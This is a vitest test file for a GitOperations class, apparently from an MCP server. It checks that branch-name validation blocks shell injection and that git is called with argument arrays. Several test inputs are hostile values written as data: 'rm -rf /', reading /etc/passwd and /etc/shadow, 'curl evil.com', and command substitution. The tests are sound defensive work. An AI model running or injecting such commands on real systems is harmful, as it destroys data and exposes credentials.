/* eslint-disable @typescript-eslint/no-explicit-any */
import { describe, it, expect, beforeEach, vi } from 'vitest';
import { GitOperations } from './git.js';
import { MCPError, ErrorCategory } from './error-handling.js';
import { execa } from 'execa';

vi.mock('execa');

describe('GitOperations - Command Injection Protection', () => {
  let git: GitOperations;
  const TEST_ROOT = '/fake/project';

  beforeEach(() => {
    git = new GitOperations(TEST_ROOT);
    vi.clearAllMocks();
    vi.resetAllMocks();
  });

  describe('ANTAGONISTIC: Command Injection Attacks', () => {
    it('should block shell injection with semicolon', async () => {
      const maliciousBranch = 'main; rm -rf /';

      await expect(git.checkout(maliciousBranch)).rejects.toThrow(MCPError);
      await expect(git.checkout(maliciousBranch)).rejects.toThrow(/Invalid branch name/);
    });

    it('should block shell injection with pipe', async () => {
      const maliciousBranch = 'main | cat /etc/passwd';

      await expect(git.checkout(maliciousBranch)).rejects.toThrow(MCPError);
    });

    it('should block shell injection with ampersand', async () => {
      const maliciousBranch = 'main && curl evil.com';

      await expect(git.checkout(maliciousBranch)).rejects.toThrow(MCPError);
    });

    it('should block shell injection with backticks', async () => {
      const maliciousBranch = 'main`whoami`';

      await expect(git.checkout(maliciousBranch)).rejects.toThrow(MCPError);
    });

    it('should block shell injection with $() command substitution', async () => {
      const maliciousBranch = 'main$(whoami)';

      await expect(git.checkout(maliciousBranch)).rejects.toThrow(MCPError);
    });

    it('should block shell injection with newline', async () => {
      const maliciousBranch = 'main\nrm -rf /';

      await expect(git.checkout(maliciousBranch)).rejects.toThrow(MCPError);
    });

    it('should block shell injection with null byte', async () => {
      const maliciousBranch = 'main\0rm -rf /';

      await expect(git.checkout(maliciousBranch)).rejects.toThrow(MCPError);
    });

    it('should block shell injection with redirection', async () => {
      const maliciousBranch = 'main > /tmp/pwned';

      await expect(git.checkout(maliciousBranch)).rejects.toThrow(MCPError);
    });

    it('should block shell injection with spaces and commands', async () => {
      const maliciousBranch = 'main; cat /etc/shadow > /tmp/pwned';

      await expect(git.checkout(maliciousBranch)).rejects.toThrow(MCPError);
    });

    it('should categorize injection attempts as Security errors', async () => {
      try {
        await git.checkout('main; rm -rf /');
        expect.fail('Should have thrown');
      } catch (error) {
        expect(error).toBeInstanceOf(MCPError);
        expect((error as MCPError).category).toBe(ErrorCategory.Security);
      }
    });
  });

  describe('ANTAGONISTIC: Edge Cases', () => {
    it('should block empty branch name', async () => {
      await expect(git.checkout('')).rejects.toThrow(MCPError);
    });

    it('should block branch name with only special chars', async () => {
      await expect(git.checkout('!@#$%^&*()')).rejects.toThrow(MCPError);
    });

    it('should handle very long branch names', async () => {
      const longBranch = 'a'.repeat(1000);
      vi.mocked(execa).mockRejectedValueOnce(new Error('Branch name too long'));

      // Should validate (passes regex) but might fail git operation
      // The key is it shouldn't crash with injection
      await expect(git.checkout(longBranch)).rejects.toThrow();
    });

    it('should block unicode injection attempts', async () => {
      const unicodeBranch = 'main\u202e; rm -rf /';

      await expect(git.checkout(unicodeBranch)).rejects.toThrow(MCPError);
    });
  });

  describe('VALID: Legitimate Branch Names', () => {
    it('should allow simple branch name', async () => {
      vi.mocked(execa).mockResolvedValueOnce({
        stdout: '',
        stderr: '',
      } as any);

      await expect(git.checkout('main')).resolves.not.toThrow();
      expect(execa).toHaveBeenCalledWith('git', ['checkout', 'main'], { cwd: TEST_ROOT });
    });

    it('should allow branch with hyphens', async () => {
      vi.mocked(execa).mockResolvedValueOnce({ stdout: '', stderr: '' } as any);

      await expect(git.checkout('feature-branch')).resolves.not.toThrow();
    });

    it('should allow branch with underscores', async () => {
      vi.mocked(execa).mockResolvedValueOnce({ stdout: '', stderr: '' } as any);

      await expect(git.checkout('feature_branch')).resolves.not.toThrow();
    });

    it('should allow branch with slashes (feature/branch)', async () => {
      vi.mocked(execa).mockResolvedValueOnce({ stdout: '', stderr: '' } as any);

      await expect(git.checkout('feature/my-branch')).resolves.not.toThrow();
    });

    it('should allow branch with numbers', async () => {
      vi.mocked(execa).mockResolvedValueOnce({ stdout: '', stderr: '' } as any);

      await expect(git.checkout('release-2024')).resolves.not.toThrow();
    });
  });

  describe('Git Operations', () => {
    it('should get current branch', async () => {
      vi.mocked(execa).mockResolvedValueOnce({
        stdout: 'main',
        stderr: '',
      } as any);

      const branch = await git.getCurrentBranch();
      expect(branch).toBe('main');
      expect(execa).toHaveBeenCalledWith('git', ['rev-parse', '--abbrev-ref', 'HEAD'], {
        cwd: TEST_ROOT,
      });
    });

    it('should handle git errors gracefully', async () => {
      vi.mocked(execa).mockRejectedValueOnce(new Error('Git command failed'));

      await expect(git.getCurrentBranch()).rejects.toThrow(MCPError);
      await expect(git.getCurrentBranch()).rejects.toThrow(/Failed to get current branch/);
    });

    it('should detect stash creation', async () => {
      vi.mocked(execa)
        .mockResolvedValueOnce({ stdout: '', stderr: '' } as any) // stashCount before (0 stashes)
        .mockResolvedValueOnce({ stdout: '', stderr: '' } as any) // stash push
        .mockResolvedValueOnce({ stdout: 'stash@{0}: test stash', stderr: '' } as any); // stashCount after (1 stash)

      const hasStash = await git.stashChanges('test stash');
      expect(hasStash).toBe(true);
    });

    it('should detect no changes to stash', async () => {
      vi.mocked(execa)
        .mockResolvedValueOnce({ stdout: '', stderr: '' } as any) // stashCount before
        .mockResolvedValueOnce({ stdout: '', stderr: '' } as any) // stash push
        .mockResolvedValueOnce({ stdout: '', stderr: '' } as any); // stashCount after

      const hasStash = await git.stashChanges('test stash');
      expect(hasStash).toBe(false);
    });

    it('should execute operations within branch context', async () => {
      vi.mocked(execa)
        .mockResolvedValueOnce({ stdout: 'main', stderr: '' } as any) // getCurrentBranch
        .mockResolvedValueOnce({ stdout: '', stderr: '' } as any) // stashCount before
        .mockResolvedValueOnce({ stdout: '', stderr: '' } as any) // stash push
        .mockResolvedValueOnce({ stdout: 'stash@{0}', stderr: '' } as any) // stashCount after
        .mockResolvedValueOnce({ stdout: '', stderr: '' } as any) // checkout feature
        .mockResolvedValueOnce({ stdout: '', stderr: '' } as any) // checkout main
        .mockResolvedValueOnce({ stdout: '', stderr: '' } as any); // stash pop

      const result = await git.withBranch('feature-branch', async () => {
        return 'test result';
      });

      expect(result).toBe('test result');
      expect(execa).toHaveBeenCalledWith('git', ['checkout', 'feature-branch'], { cwd: TEST_ROOT });
      expect(execa).toHaveBeenCalledWith('git', ['checkout', 'main'], { cwd: TEST_ROOT });
    });

    it('should restore branch even if operation fails', async () => {
      vi.mocked(execa)
        .mockResolvedValueOnce({ stdout: 'main', stderr: '' } as any) // getCurrentBranch
        .mockResolvedValueOnce({ stdout: '', stderr: '' } as any) // stashCount before
        .mockResolvedValueOnce({ stdout: '', stderr: '' } as any) // stash push
        .mockResolvedValueOnce({ stdout: '', stderr: '' } as any) // stashCount after
        .mockResolvedValueOnce({ stdout: '', stderr: '' } as any) // checkout feature
        .mockResolvedValueOnce({ stdout: '', stderr: '' } as any) // checkout main (cleanup)
        .mockResolvedValueOnce({ stdout: '', stderr: '' } as any); // stash pop (cleanup)

      await expect(
        git.withBranch('feature-branch', async () => {
          throw new Error('Operation failed');
        }),
      ).rejects.toThrow('Operation failed');

      // Should have returned to main branch
      const checkoutCalls = vi.mocked(execa).mock.calls.filter((call) => {
        const args = call[1] as string[] | undefined;
        return args?.[0] === 'checkout';
      });
      expect(checkoutCalls).toContainEqual(['git', ['checkout', 'main'], { cwd: TEST_ROOT }]);
    });
  });

  describe('Security: Validates array-form commands', () => {
    it('should never use shell interpolation', async () => {
      vi.mocked(execa).mockResolvedValueOnce({ stdout: '', stderr: '' } as any);

      await git.checkout('main');

      const call = vi.mocked(execa).mock.calls[0];
      if (!call) throw new Error('Expected execa to be called');
      expect(call[0]).toBe('git');
      expect(Array.isArray(call[1])).toBe(true);
      expect(call[1]).toEqual(['checkout', 'main']);
    });

    it('should pass branch name as separate argument', async () => {
      vi.mocked(execa).mockResolvedValueOnce({ stdout: '', stderr: '' } as any);

      await git.checkout('feature/my-branch');

      const call = vi.mocked(execa).mock.calls[0];
      if (!call) throw new Error('Expected execa to be called');
      expect(call[1]).toEqual(['checkout', 'feature/my-branch']);
      // NOT: ['checkout feature/my-branch'] which would be vulnerable
    });
  });
});
